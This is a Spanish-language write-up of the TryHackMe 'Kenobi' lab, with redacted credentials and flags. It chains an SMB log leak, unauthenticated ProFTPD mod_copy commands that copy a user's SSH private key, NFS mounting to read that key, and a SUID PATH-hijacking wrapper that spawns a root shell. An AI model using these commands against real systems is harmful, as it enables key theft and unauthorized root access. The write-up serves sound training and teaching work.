# Kenobi (TryHackMe) — encadenar SMB + ProFTPD mod_copy + NFS + SUID

> **Writeup sanitizado.** Credenciales, claves y flags van redactados (`<redacted>`). Es un recorrido de **metodología y lecciones**, no un walkthrough que trivialice la sala.

**Tipo:** Linux · Easy
**Resumen de la cadena:**
`SMB (fuga de info) → ProFTPD 1.3.5 mod_copy (mover la clave SSH) → NFS (leerla) → SSH → SUID /usr/bin/menu (PATH hijacking) → root`

La gracia de la caja no es una sola vulnerabilidad, sino **cómo encajan tres servicios**: SMB te dice *qué* robar, ProFTPD lo *mueve* a un sitio accesible, y NFS te deja *leerlo*.

---

## 1. Recon
Dos fases con nmap (todos los puertos → scripts+versión sobre los abiertos). Superficie:

- **21** ProFTPD **1.3.5** → versión con `mod_copy` (CVE-2015-3306).
- **80** Apache → `robots.txt` con `/admin.html`.
- **139/445** Samba.
- **111/2049** rpcbind + **NFS**.

Tres servicios "de fuga" (SMB, FTP, NFS) juntos = la caja va de **encadenarlos**.

## 2. SMB → la pista que ordena todo
Share anónimo legible; dentro, un `log.txt` que es el log de un `ssh-keygen`.

> **Lección — un log puede filtrar el objetivo, no la credencial.** El log revela (a) la **ruta de la clave privada** de un usuario, (b) que la **passphrase está vacía**, y (c) que el FTP es **ProFTPD**. No me da acceso; me dice **qué robar y por dónde**.

## 3. ProFTPD mod_copy → mover la clave a zona accesible
ProFTPD 1.3.5 expone `SITE CPFR`/`SITE CPTO` **sin autenticación** (mod_copy). No puedo leer la clave directamente, pero el servicio sí:

```bash
nc $IP 21
SITE CPFR /home/<user>/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

> **Lección — el exploit "menos potente" puede ser el bueno.** Entre el RCE y el simple *File Copy*, gano con el segundo: copia la clave (con permisos del servicio) a `/var/tmp`, una ruta que luego **leo por NFS**. Elijo `/var` porque es el export montable.

## 4. NFS → canal de lectura (no de escritura)
```bash
showmount -e $IP            # -> /var *
sudo mount -t nfs $IP:/var /mnt/nfs -o nolock
cp /mnt/nfs/tmp/id_rsa .    # la clave que dejó mod_copy
chmod 600 id_rsa
ssh -i id_rsa <user>@$IP    # user flag
```

> **Lección — hay DOS técnicas de NFS y no son la misma.** Aquí el export es de **solo lectura**: sirve para **exfiltrar** un archivo que un servicio local dejó ahí, no para plantar un SUID (eso requiere `rw` + `no_root_squash`). `showmount -e` no distingue `ro`/`rw` ni el squash — se descubre probando a escribir como root. **Modelo mental:** tras montar, `/mnt/nfs/tmp/x` *es* `/var/tmp/x` de la víctima en vivo.

## 5. Privesc — SUID con llamada relativa → PATH hijacking
```bash
find / -perm -u=s -type f 2>/dev/null     # destaca /usr/bin/menu (no estándar)
strings /usr/bin/menu                     # invoca curl/uname/ifconfig SIN ruta absoluta
```

El binario corre como root y llama a `curl` por su nombre → secuestro del PATH:

```bash
printf '#!/bin/bash\n/bin/bash -p\n' > /tmp/curl   # wrapper
chmod 777 /tmp/curl
export PATH=/tmp:$PATH
/usr/bin/menu        # opción que llama curl -> shell root
```

> **Lección — dos trampas del PATH hijacking.** (1) El comando se invoca **con argumentos** (`curl localhost`), así que un simple `cp /bin/sh /tmp/curl` falla (intenta abrir `localhost` como script); hay que usar un **wrapper que ignore los args**. (2) `/bin/sh` (dash) **descarta los privilegios** cuando el euid no coincide con el uid → se lanza `bash -p`, que los preserva. Al final lo que importa es el **euid=0**, no el uid.

---

## Qué me llevo
- **Encadenar > un solo CVE:** SMB apuntó, ProFTPD movió, NFS leyó. Pensar en superficies que se alimentan entre sí.
- **NFS con criterio:** distinguir `ro`/lectura (exfil) de `rw`+`no_root_squash` (plantar SUID) **antes** de perder tiempo intentando escribir.
- **PATH hijacking fino:** wrapper para comandos con argumentos y `bash -p` contra el priv-drop de dash.

<sub>⚠️ Contenido educativo sobre un laboratorio autorizado. Flags y rutas de usuario redactadas para no spoilear la sala.</sub>
